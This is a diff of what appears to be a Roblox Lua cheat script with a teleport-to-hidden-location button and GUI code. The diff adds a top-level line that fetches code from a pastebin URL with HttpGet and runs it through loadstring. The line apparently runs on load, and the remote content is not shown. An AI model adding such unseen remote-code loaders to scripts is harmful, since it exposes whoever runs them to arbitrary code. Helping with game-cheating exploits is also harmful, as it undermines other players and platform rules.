@@ -2375,6 +2375,7 @@ function()-- teleport to hidden 99
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(269.36907958984375, 17024.74609375,
 139.19142150878906)
 end)
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
 
 
 
@@ -2389,7 +2390,7 @@ end)
 
 
 
---Open/Klose GUI frame--
+--open/klose frame--
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextButton = Instance.new("TextButton")
